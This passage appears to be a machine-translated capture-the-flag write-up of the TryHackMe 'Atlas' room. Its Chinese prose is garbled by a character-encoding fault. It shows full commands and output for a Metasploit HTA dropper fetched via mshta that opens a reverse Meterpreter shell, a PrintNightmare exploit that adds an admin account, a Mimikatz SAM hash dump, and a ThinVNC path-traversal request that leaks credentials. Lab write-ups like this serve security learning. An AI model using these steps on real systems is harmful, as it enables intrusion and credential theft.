iv">â”Œâ”€â”€(dna@deniers)-[~/atlas]<br/>â””â”€$ sudo msfconsole  </strong>              <br/>[sudo] password for dna: <strong class="mm iv">*inputs password*</strong></span><span id="afab" class="mr lh iu mm b gz nj mt l mu mv">[... snip ...]</span><span id="265f" class="mr lh iu mm b gz nj mt l mu mv"><strong class="mm iv">msf6 &gt; use exploit/windows/misc/hta_server</strong><br/>[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp<br/><strong class="mm iv">msf6 exploit(windows/misc/hta_server) &gt; set SRVHOST 0.0.0.0</strong><br/>SRVHOST =&gt; 0.0.0.0<br/><strong class="mm iv">msf6 exploit(windows/misc/hta_server) &gt; set LHOST &lt;attackbox ip&gt;</strong><br/>LHOST =&gt; &lt;attackbox ip&gt;<br/><strong class="mm iv">msf6 exploit(windows/misc/hta_server) &gt; exploit</strong><br/>[*] Exploit running as background job 0.<br/>[*] Exploit completed, but no session was created.</span><span id="67b4" class="mr lh iu mm b gz nj mt l mu mv">[*] Started reverse TCP handler on &lt;attackbox ip&gt;:4444 <br/>[*] Using URL: http://&lt;attackbox ip&gt;:8080/dropper.hta<br/>[*] Server started.</span></pre><p id="6c96" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">åœ¨ç›®æ ‡æœºå™¨çš„å‘½ä»¤æç¤ºç¬¦ä¸‹è¿è¡Œäº†å‘½ä»¤<code class="fe mj mk ml mm b">mshta.exe http://&lt;attackbox ip&gt;:8080/dropper.hta </code>ä¹‹åï¼Œæˆ‘å¾—åˆ°äº†ä¸€ä¸ªåå‘çš„Meterpreter shellï¼Œå¹¶å¼€å§‹ä¸å®ƒè¿›è¡Œäº¤äº’:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="63e0" class="mr lh iu mm b gz ms mt l mu mv"><strong class="mm iv">msf6 exploit(windows/misc/hta_server) &gt;</strong> [*] Sending stage (175174 bytes) to &lt;target ip&gt;<br/>[*] Meterpreter session 1 opened (&lt;attackbox ip&gt;:4444 -&gt; atlas.thm:49859 ) at [redacted] -0400</span><span id="6079" class="mr lh iu mm b gz nj mt l mu mv"><strong class="mm iv">msf6 exploit(windows/misc/hta_server) &gt; sessions -i 1</strong><br/>[*] Starting interaction with 1...</span><span id="2fdf" class="mr lh iu mm b gz nj mt l mu mv"><strong class="mm iv">meterpreter &gt;</strong></span></pre><p id="371d" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">ä¸ºäº†è·å¾—ç³»ç»Ÿæƒé™ï¼Œæˆ‘å°†å°è¯•Meterpreterçš„<code class="fe mj mk ml mm b">priv</code>æ¨¡å—é™„å¸¦çš„ä¼ ç»Ÿ<code class="fe mj mk ml mm b">getsystem</code>å‘½ä»¤:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="14e2" class="mr lh iu mm b gz ms mt l mu mv"><strong class="mm iv">meterpreter &gt; getsystem</strong><br/>[-] priv_elevate_getsystem: Operation failed: 1346 The following was attempted:<br/>[-] Named Pipe Impersonation (In Memory/Admin)<br/>[-] Named Pipe Impersonation (Dropper/Admin)<br/>[-] Token Duplication (In Memory/Admin)<br/>[-] Named Pipe Impersonation (RPCSS variant)<br/>[-] Named Pipe Impersonation (PrintSpooler variant)<br/><strong class="mm iv">meterpreter &gt;</strong></span></pre><p id="5aa4" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">çœ‹æ¥<code class="fe mj mk ml mm b">getsystem</code>ä¸è¡Œäº†ã€‚è¯¥å®¤å»ºè®®é€šè¿‡PrintNightmareæ¼æ´å‘é‡æå‡æƒé™(<a class="ae kp" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527" rel="noopener ugc nofollow" target="_blank">å¾®è½¯å®‰å…¨å“åº”ä¸­å¿ƒï¼Œ2021 </a>)ã€‚ç‰¹åˆ«æ˜¯ï¼Œå»ºè®®ç«äº‰è€…ä½¿ç”¨ç”±Stewartå’ŒHammond (2021) è®¾è®¡çš„PrintNightmareå®ç°ã€‚</p><p id="cc13" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">é¦–å…ˆï¼Œæˆ‘å°†æŠŠå®ƒçš„å­˜å‚¨åº“å…‹éš†åˆ°æ”»å‡»æ¡†ä¸Šçš„æˆ‘çš„é¡¹ç›®æ–‡ä»¶å¤¹ä¸­:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="621c" class="mr lh iu mm b gz ms mt l mu mv"><strong class="mm iv">â”Œâ”€â”€(dna@deniers)-[~/atlas]<br/>â””â”€$ git clone https://github.com/calebstewart/CVE-2021-1675</strong><br/>Cloning into 'CVE-2021-1675'...<br/>remote: Enumerating objects: 40, done.<br/>remote: Counting objects: 100% (40/40), done.<br/>remote: Compressing objects: 100% (32/32), done.<br/>remote: Total 40 (delta 9), reused 37 (delta 6), pack-reused 0<br/>Receiving objects: 100% (40/40), 131.12 KiB | 2.22 MiB/s, done.<br/>Resolving deltas: 100% (9/9), done.<br/>                                                                                                                                    <br/><strong class="mm iv">â”Œâ”€â”€(dna@deniers)-[~/atlas]<br/>â””â”€$</strong></span></pre><p id="1c97" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">ç„¶ååœ¨Meterpreterä¼šè¯ä¸­ï¼Œæˆ‘åœ¨ç³»ç»Ÿä¸Šå¯åŠ¨äº†ä¸€ä¸ª<code class="fe mj mk ml mm b">shell</code>æ¥å£ï¼Œç„¶åå¯åŠ¨äº†PowerShellå¹¶å¯åŠ¨äº†æ¼æ´åˆ©ç”¨:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="6670" class="mr lh iu mm b gz ms mt l mu mv"><strong class="mm iv">meterpreter &gt; powershell_shell</strong><br/><strong class="mm iv">PS &gt; . \\tsclient\atlas\CVE-2021-1675\CVE-2021-1675.ps1<br/>PS &gt; Invoke-Nightmare</strong><br/>[+] using default new user: adm1n<br/>[+] using default new password: P@ssw0rd<br/>[+] created payload at C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll</span><span id="6a62" class="mr lh iu mm b gz nj mt l mu mv">[*] atlas.thm - Meterpreter session 1 closed.  Reason: Died</span><span id="3f7a" class="mr lh iu mm b gz nj mt l mu mv">Terminate channel 1? [y/N] <strong class="mm iv">*Y*</strong><br/>[-] Error running command powershell_shell: Rex::TimeoutError Operation timed out.</span></pre><p id="6cb6" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">ä»è¾“å‡ºæ¥çœ‹ï¼Œçœ‹èµ·æ¥åƒæ˜¯ç”¨ç”¨æˆ·å<code class="fe mj mk ml mm b">adm1n</code>å’Œå¯†ç <code class="fe mj mk ml mm b">P@ssw0rd</code>åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„ç®¡ç†å‘˜å¸æˆ·ã€‚ç°åœ¨ï¼Œæˆ‘å°†ä»¥è¿™ä¸ªæ–°ç®¡ç†å‘˜ç”¨æˆ·çš„èº«ä»½è¿è¡ŒWindowså‘½ä»¤æç¤ºç¬¦ï¼Œæ–¹æ³•æ˜¯å³é”®å•å‡»å‘½ä»¤æç¤ºç¬¦å¹¶è¾“å…¥æ–°åˆ›å»ºçš„å‡­è¯(å‚è§å›¾6):</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div class="gi gj np"><img src="../Images/ba6d76f8507290bb56279de4a40f7d72.png" data-original-src="https://miro.medium.com/v2/resize:fit:982/format:webp/1*B5TmqXbu8a17PF-zjbgOZA.png"/></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">å›¾6 </strong></figcaption></figure><p id="e038" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">ç”¨æˆ·å<code class="fe mj mk ml mm b">adm1n</code>è¢«æä¾›ç»™ç”¨æˆ·å­—æ®µ(å›¾6a)ï¼Œå¯†ç <code class="fe mj mk ml mm b">P@ssw0rd</code>è¢«æä¾›ç»™å¯†ç å­—æ®µ(å›¾6b)ã€‚ç„¶åå•å‡»â€œOKâ€æŒ‰é’®è¿›å…¥ç®¡ç†å‘˜å‘½ä»¤æç¤ºç¬¦ã€‚ä¸å¹¸çš„æ˜¯ï¼Œç”¨æˆ·åå’Œå¯†ç æ— æ³•è¯†åˆ«(å›¾7)ã€‚</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div class="gi gj nq"><img src="../Images/101dbdece7dc6fc718782a5071e11f07.png" data-original-src="https://miro.medium.com/v2/resize:fit:1008/format:webp/1*qbyHyIAcA5WLLi9TzuApEg.png"/></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">å›¾7 </strong></figcaption></figure><p id="453f" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">çœ‹èµ·æ¥æˆ‘éœ€è¦æ‰¾ä¸€ä¸ªâ€œå·¥ä½œåœºæ‰€â€</p></div><div class="ab cl nr ns hy nt" role="separator"><span class="nu bw bk nv nw nx"/><span class="nu bw bk nv nw nx"/><span class="nu bw bk nv nw"/></div><div class="in io ip iq ir"><p id="d8cb" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">åœ¨è¿™ä¸ªå®éªŒä¸­ï¼Œæˆ‘åˆ‡æ¢åˆ°Remminaæ‰“å¼€çš„è¿œç¨‹æ¡Œé¢å®ä¾‹ï¼Œå¹¶é€šè¿‡è¿œç¨‹æ¡Œé¢ä»PowerShellç•Œé¢è¿è¡Œæ¼æ´åˆ©ç”¨:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="e483" class="mr lh iu mm b gz ms mt l mu mv">Windows PowerShell<br/>Copyright (C) Microsoft Corporation. All rights reserved.</span><span id="ed6e" class="mr lh iu mm b gz nj mt l mu mv"><strong class="mm iv">PS C:\Users\Atlas&gt; Import-Module \\tsclient\atlas\CVE-2021-1675\CVE-2021-1675.ps1</strong></span><span id="15ed" class="mr lh iu mm b gz nj mt l mu mv">Security warning<br/>Run only scripts that you trust. While scripts from the internet can be useful, this script can potentially harm your<br/>computer. If you trust this script, use the Unblock-File cmdlet to allow the script to run without this warning<br/>message. Do you want to run \\tsclient\atlas\CVE-2021-1675\CVE-2021-1675.ps1?<br/>[D] Do not run  [R] Run once  [S] Suspend  [?] Help (default is "D"): R</span><span id="ed51" class="mr lh iu mm b gz nj mt l mu mv"><strong class="mm iv">PS C:\Users\Atlas&gt; Invoke-Nightmare</strong><br/>[+] using default new user: adm1n<br/>[+] using default new password: P@ssw0rd<br/>[+] created payload at C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll<br/>[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_18b0d38ddfaee729\Amd64\mxdwdrv.dll"<br/>[+] added user  as local administrator<br/>[+] deleting payload from C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll<br/><strong class="mm iv">PS C:\Users\Atlas&gt; net user</strong></span><span id="596a" class="mr lh iu mm b gz nj mt l mu mv">User accounts for \\GAIA</span><span id="dab8" class="mr lh iu mm b gz nj mt l mu mv">--------------------------------------------------------------------<br/>adm1n <strong class="mm iv">[*]</strong>                Administrator            Atlas<br/>DefaultAccount           Guest                    WDAGUtilityAccount<br/>The command completed successfully.</span><span id="1b88" class="mr lh iu mm b gz nj mt l mu mv"><strong class="mm iv">PS C:\Users\Atlas&gt;</strong></span></pre><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gi gj ny"><img src="../Images/9275b45669e48fb28ed3af7b33d6f03a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GD1dN_WexxZ8Nfc6pbY4Vg.png"/></div></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">å›¾8 </strong></figcaption></figure><p id="0f6d" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">ç„¶åï¼Œæˆ‘é€šè¿‡Remminaç™»å½•åˆ°æ–°çš„adm1nå¸æˆ·ï¼Œä½¿ç”¨å¼€å‘é˜¶æ®µæè¿°çš„ç¨‹åº(ç‰¹åˆ«æ˜¯å›¾4)ï¼Œä»¥ç®¡ç†å‘˜èº«ä»½æ‰“å¼€Windowså‘½ä»¤æç¤ºç¬¦(å›¾8a)ï¼ŒæŒ‡ç¤º<code class="fe mj mk ml mm b">mshta.exe</code>é€šè¿‡dropperè·å–Meterpreteråå‘å¤–å£³(å›¾8b)å¹¶â€¦</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="4adf" class="mr lh iu mm b gz ms mt l mu mv">[*] atlas.htm hta_server - Delivering Payload<br/>[*] Sending stage (175174 bytes) to atlas.thm<br/>[*] Meterpreter session 2 opened (&lt;attackbox ip&gt;:4444 -&gt; atlas.thm:49842 ) at [redacted] -0400</span><span id="07e4" class="mr lh iu mm b gz nj mt l mu mv">msf6 exploit(windows/misc/hta_server) &gt; sessions -i 2<br/>[*] Starting interaction with 2...</span><span id="1cde" class="mr lh iu mm b gz nj mt l mu mv"><strong class="mm iv">meterpreter &gt;</strong></span></pre><p id="a9fc" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">æˆ‘å°†å†æ¬¡å°è¯•<code class="fe mj mk ml mm b">getsystem</code>æƒé™æå‡æ–¹æ³•:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="5ed6" class="mr lh iu mm b gz ms mt l mu mv">[*] Starting interaction with 2...</span><span id="dde8" class="mr lh iu mm b gz nj mt l mu mv"><strong class="mm iv">meterpreter &gt; getsystem</strong><br/>...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).<br/><strong class="mm iv">meterpreter &gt; getuid</strong><br/>Server username: NT AUTHORITY\SYSTEM<br/><strong class="mm iv">meterpreter &gt;</strong></span></pre><p id="c52f" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">å¤ªæ£’äº†ã€‚</p></div><div class="ab cl nr ns hy nt" role="separator"><span class="nu bw bk nv nw nx"/><span class="nu bw bk nv nw nx"/><span class="nu bw bk nv nw"/></div><div class="in io ip iq ir"><p id="03d5" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">æœ‰äº†<code class="fe mj mk ml mm b">SYSTEM</code>çº§åˆ«çš„æƒé™ï¼Œæˆ‘ç°åœ¨å¯ä»¥ç»§ç»­å°†å“ˆå¸Œè½¬å‚¨åˆ°ç³»ç»Ÿä¸­ã€‚å‡ºäºæŒä¹…æ€§çš„ç›®çš„ï¼Œæˆ‘å°†è·å–<code class="fe mj mk ml mm b">Administrator</code>è´¦æˆ·çš„NTLMæ•£åˆ—ã€‚</p><p id="bf95" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">æˆ‘å°†é€šè¿‡Meterpreterçš„<code class="fe mj mk ml mm b">kiwi</code>æ‰©å±•ä½¿ç”¨<em class="nz">Mimikatz</em>(<a class="ae kp" href="https://attack.mitre.org/software/S0002/" rel="noopener ugc nofollow" target="_blank">MITRE ATT&amp;CKæ¡†æ¶ï¼Œ2017 </a>)é€šè¿‡å®ƒçš„<code class="fe mj mk ml mm b">lsa_dump_sam</code>å‘½ä»¤è·å¾—å“ˆå¸Œå€¼:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="e547" class="mr lh iu mm b gz ms mt l mu mv"><strong class="mm iv">meterpreter &gt; load kiwi</strong><br/>Loading extension kiwi...<br/>  .#####.   mimikatz 2.2.0 20191125 (x64/windows)<br/> .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)<br/> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` (benjamin@gentilkiwi.com)<br/> ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz<br/> '## v ##'        Vincent LE TOUX (vincent.letoux@gmail.com )<br/>  '#####'         &gt; http://pingcastle.com / http://mysmartlogon.com  ***/</span><span id="c5e2" class="mr lh iu mm b gz nj mt l mu mv">Success.</span><span id="e9dd" class="mr lh iu mm b gz nj mt l mu mv"><strong class="mm iv">meterpreter &gt; lsa_dump_sam</strong><br/>[+] Running as SYSTEM<br/>[*] Dumping SAM<br/>Domain : GAIA<br/>SysKey : 36c8d26ec0df8b23ce63bcefa6e2d821<br/>Local SID : S-1-5-21-1966530601-3185510712-10604624</span><span id="54e6" class="mr lh iu mm b gz nj mt l mu mv">SAMKey : 6e708461100b4988991ce3b4d8b1784e</span><span id="a607" class="mr lh iu mm b gz nj mt l mu mv">RID  : 000001f4 (500)<br/>User : Administrator<br/>  Hash NTLM: <strong class="mm iv"><em class="nz">*c16444961f67af7eea7e420b65c8c3eb*</em></strong></span><span id="ded4" class="mr lh iu mm b gz nj mt l mu mv">[... snip ...]</span><span id="de1b" class="mr lh iu mm b gz nj mt l mu mv"><strong class="mm iv">meterpreter &gt;</strong></span></pre><p id="d491" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">kiwiæ¨¡å—æŠ¥å‘Šè¯´<code class="fe mj mk ml mm b">Administrator</code>çš„NTLMæ•£åˆ—æ˜¯:<code class="fe mj mk ml mm b">c16444961f67af7eea7e420b65c8c3eb</code>ï¼Œå®ƒå¯ä»¥ç”¨äºå¯†ç ç ´è§£æˆ–ä¼ é€’æ•£åˆ—ç›®çš„(<a class="ae kp" href="https://www.sans.org/white-papers/33219/" rel="noopener ugc nofollow" target="_blank">èƒ¡æ¢…å°”ï¼ŒC </a>)ã€‚</p><p id="05d1" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">é˜¿æ´›æ‹‰ã€‚</p><h1 id="f99b" class="lg lh iu bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">æ‘˜è¦</h1><p id="d88c" class="pw-post-body-paragraph jr js iu jt b ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk mi km kn ko in bi translated">å°½ç®¡è¿™æ˜¯ä¸€ä¸ªç®€å•çš„â€œè¾…å¯¼å®¤â€ï¼Œä½†èŠ±è´¹çš„æ—¶é—´æ¯”é¢„æœŸçš„è¦é•¿ï¼Œå› ä¸ºæˆ‘æœ‰ç‚¹å¥‡æ€ªçš„ä¹ æƒ¯ï¼Œæœ‰ç‚¹åç¦»æˆ¿é—´ä½œè€…ç»™å‡ºçš„è¯´æ˜ã€‚é»‘å®¢è¡Œä¸ºå°±æ˜¯æ‰“ç ´å¸¸è§„ï¼Œæ‰¾åˆ°è§£å†³å¸¸è§„é—®é¢˜çš„æ–°é¢–è€Œå·§å¦™çš„æ–¹æ³•â€”â€”å°¤å…¶æ˜¯åœ¨æ”»å‡»æ€§å®‰å…¨é—®é¢˜ä¸Šã€‚</p><p id="cc3f" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">å°½ç®¡å¦‚æ­¤ï¼Œæˆ‘è¿˜æ˜¯æŒ‰ç…§ä½œè€…åœ¨é™„å½•A.2ä¸­çš„æ„å›¾ï¼Œä¸ºæ„Ÿå…´è¶£çš„äººä½¿ç”¨äº†PrintNightmareæ¼æ´ã€‚æˆ‘è¿˜æ‰‹åŠ¨åˆ©ç”¨äº†é™„å½•A.1ä¸­çš„ThinVNCæ¼æ´å‘é‡æ¥æŸ¥æ‰¾ä»»ä½•è¶…å¸¸è€…ã€‚</p><h2 id="7eef" class="mr lh iu bd li mw mx dn lm my mz dp lq kc na nb lu kg nc nd ly kk ne nf mc ng bi translated">å¤–å–é£Ÿå“</h2><ul class=""><li id="2d47" class="oa ob iu jt b ju me jy mf kc oc kg od kk oe ko of og oh oi bi translated">æ¦‚å¿µéªŒè¯æœ‰æ—¶ä¼šè¢«æ‰“ç ´ï¼Œå› æ­¤å»ºç«‹ä¸€ä¸ªè™šæ‹Ÿæœºå®éªŒå®¤ï¼Œå¹¶ç¡®ä¿é¦–å…ˆå¯¹å…¶è¿›è¡Œæµ‹è¯•ã€‚</li><li id="4ae3" class="oa ob iu jt b ju oj jy ok kc ol kg om kk on ko of og oh oi bi translated">å¦‚æœæ¦‚å¿µéªŒè¯å¤±è´¥äº†ï¼Œè¯•ç€è°ƒè¯•å®ƒï¼Œåœ¨ç½‘ä¸Šæ‰¾ä¸€ä¸ªæ›´å¯é çš„å®ç°ï¼Œç”šè‡³è‡ªå·±è®¾è®¡ã€‚æˆ‘é€‰æ‹©äº†ç¬¬äºŒä¸ªå’Œç¬¬ä¸‰ä¸ªæ¥å¼€å‘ThinVNCã€‚</li><li id="9d26" class="oa ob iu jt b ju oj jy ok kc ol kg om kk on ko of og oh oi bi translated">é™¤éä½ æ­£åœ¨å‚åŠ <em class="nz">æ”»å‡»æ€§å®‰å…¨è®¤è¯ä¸“å®¶</em>è€ƒè¯•ï¼Œå¦åˆ™ä¸è¦å®³æ€•ä½¿ç”¨Metasploitå’ŒMeterpreterè®©ä½ çš„ç”Ÿæ´»å˜å¾—æ›´è½»æ¾ï¼›-)</li></ul><h2 id="67be" class="mr lh iu bd li mw mx dn lm my mz dp lq kc na nb lu kg nc nd ly kk ne nf mc ng bi translated">æ’å¤´</h2><p id="406b" class="pw-post-body-paragraph jr js iu jt b ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk mi km kn ko in bi translated">çœ‹çœ‹æˆ‘çš„æœ‹å‹ç±³æ‹‰Â·æ‹‰è¾›ï¼Œå¥¹å’Œå…¶ä»–åŒäº‹ä¸€æ ·ï¼Œéœ€è¦ç»æµå’Œæƒ…æ„Ÿä¸Šçš„å¸®åŠ©ã€‚è¯·æŸ¥çœ‹ä»¥ä¸‹é“¾æ¥:</p><ul class=""><li id="bf7d" class="oa ob iu jt b ju jv jy jz kc oo kg op kk oq ko of og oh oi bi translated">å¥¹çš„æ¨ç‰¹ç®€ä»‹:<a class="ae kp" href="https://twitter.com/MiraLazine" rel="noopener ugc nofollow" target="_blank">https://twitter.com/MiraLazine</a></li><li id="8a95" class="oa ob iu jt b ju oj jy ok kc ol kg om kk on ko of og oh oi bi translated">å¥¹çš„ä¸­ç­‰èº«æ:<a class="ae kp" href="https://medium.com/@MiraLazine" rel="noopener">https://medium.com/@MiraLazine</a></li><li id="75bb" class="oa ob iu jt b ju oj jy ok kc ol kg om kk on ko of og oh oi bi translated">ç”¨ç°é‡‘æç»™å¥¹è‡ªå·±ã€‚app:<a class="ae kp" href="https://cash.app/$MiraLazine" rel="noopener ugc nofollow" target="_blank">https://cash.app/$MiraLazine</a></li></ul><h1 id="e6b7" class="lg lh iu bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">é™„å½•</h1><h2 id="66ad" class="mr lh iu bd li mw mx dn lm my mz dp lq kc na nb lu kg nc nd ly kk ne nf mc ng bi translated">A.1äººå·¥å¼€é‡‡</h2><p id="69d3" class="pw-post-body-paragraph jr js iu jt b ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk mi km kn ko in bi translated"><a class="ae kp" href="https://tryhackme.com/room/atlas" rel="noopener ugc nofollow" target="_blank">â€œMurilandOracleâ€(2022 aï¼Œä»»åŠ¡4) </a>æŒ‘æˆ˜ç«äº‰è€…æ‰‹åŠ¨æ‰§è¡ŒThinVNCæ¼æ´åˆ©ç”¨ã€‚ä¸ºäº†äº†è§£ä»–è®¾è®¡çš„æ¼æ´åˆ©ç”¨æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Œæˆ‘å°†æ£€æŸ¥å…¶æºä»£ç çš„ç›¸å…³éƒ¨åˆ†ã€‚ä»¥ä¸‹æ˜¯ç©†å…°å¤šå°”å¯¹ç ´ç¢çš„æ¦‚å¿µè¯æ˜çš„ä¿®æ­£çš„æ‘˜å½•:</p><figure class="kr ks kt ku gu kv"><div class="bz fq l di"><div class="nk nl l"/></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated">åœ¨<a class="ae kp" href="https://github.com/MuirlandOracle/CVE-2019-17662" rel="noopener ugc nofollow" target="_blank">ä¹‹åç©†å…°å¤šå°”(2022b) </a></figcaption></figure><p id="82ed" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">MurilandOracleåˆ©ç”¨çš„é‡è¦ä¹‹å¤„åœ¨äºï¼Œå®ƒä»å‘½ä»¤è¡Œæ¥å—å‚æ•°ï¼Œå¹¶å°†ç›®æ ‡URLä½œä¸ºå­—ç¬¦ä¸²å­˜å‚¨åœ¨<code class="fe mj mk ml mm b">url</code>ä¸­ã€‚è¦æ”»å‡»çš„ç«¯å£ä½œä¸ºä¸€ä¸ªæ•´æ•°å­˜å‚¨åœ¨<code class="fe mj mk ml mm b">port</code>å˜é‡ä¸­ã€‚</p><p id="b8b2" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">æ ¹æ®æ˜¯å¦ä½¿ç”¨äº†<code class="fe mj mk ml mm b">ssl</code>å‚æ•°ï¼Œ<code class="fe mj mk ml mm b">url</code>ä½¿ç”¨äº†<code class="fe mj mk ml mm b">http://</code>æˆ–<code class="fe mj mk ml mm b">https://</code>ã€‚ç„¶åï¼Œè¯¥æ¼æ´åˆ©ç”¨<code class="fe mj mk ml mm b">GET</code>å‡†å¤‡å¥½çš„è¯­å¥å‘å‡º<code class="fe mj mk ml mm b">HTTP</code>è¯·æ±‚ã€‚å…·ä½“æ¥è¯´ï¼Œè¯¥æ¼æ´å°†å‘å‡ºçš„è¯·æ±‚æ˜¯:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="6af8" class="mr lh iu mm b gz ms mt l mu mv">http://atlas.thm:8080/abc/../../ThinVNC.ini</span></pre><p id="46ab" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">æˆ‘æ‰‹åŠ¨â€œå¤åˆ¶â€äº†è¿™ä¸ªæ¼æ´ï¼Œæ–¹æ³•æ˜¯æ‰“å¼€python3 shellï¼Œæ‰‹åŠ¨è¾“å…¥MurilandOracleæ¼æ´åçš„å‘½ä»¤:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="62ce" class="mr lh iu mm b gz ms mt l mu mv"><strong class="mm iv">â”Œâ”€â”€(dnaã‰¿deniers)-[~/atlas]<br/>â””â”€$ python3  </strong>                  <br/>Python 3.9.11 (main, [redacted]) <br/>[GCC 11.2.0] on linux<br/>Type "help", "copyright", "credits" or "license" for more information.<br/><strong class="mm iv">&gt;&gt;&gt; import requests<br/>&gt;&gt;&gt; url_to_attack = "http://atlas.thm:8080/abc/../../ThinVNC.ini"<br/>&gt;&gt;&gt; request = requests.Request(method="GET", url=url_to_attack)<br/>&gt;&gt;&gt; prep_request = request.prepare()</strong><br/><strong class="mm iv">&gt;&gt;&gt; prep_request.url = url_to_attack<br/>&gt;&gt;&gt; suss = requests.Session()</strong><br/><strong class="mm iv">&gt;&gt;&gt; attack = suss.send(prep_request, timeout=3)<br/>&gt;&gt;&gt; attack.text</strong><br/>'[Authentication]\r\nUnicode=0\r\n<strong class="mm iv"><em class="nz">User=Atlas</em></strong>\r\n<strong class="mm iv"><em class="nz">Password=[redacted]</em></strong>\r\nType=Digest\r\n[Http]\r\nPort=8080\r\nEnabled=1\r\n[Tcp]\r\nPort=\r\n[General]\r\nAutoStart=1\r\n'<br/><strong class="mm iv">&gt;&gt;&gt;</strong></span></pre><p id="3737" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">é˜¿æ´›æ‹‰ã€‚</p><h2 id="06d0" class="mr lh iu bd li mw mx dn lm my mz dp lq kc na nb lu kg nc nd ly kk ne nf mc ng bi translated">A.2ä½¿ç”¨Mimikatzè½¬å‚¨å“ˆå¸Œ</h2><p id="ad26" class="pw-post-body-paragraph jr js iu jt b ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk mi km kn ko in bi translated">æˆ‘æœ‰ä¸€ä¸ªåä¹ æƒ¯ï¼Œå°±æ˜¯åœ¨åšè¾…å¯¼å®¤çš„æ—¶å€™â€œæŠŠäº‹æƒ…ææ··â€ï¼Œè¿™æœ‰ç‚¹è¿åè§„åˆ™ã€‚åœ¨è¿™ä¸ªæˆ¿é—´é‡Œï¼Œæˆ‘åœ¨è¿›è¡Œæƒé™å‡çº§åä½¿ç”¨äº†<em class="nz"> Meterpreter </em>æ¨¡å—ã€‚</p><p id="85ce" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke 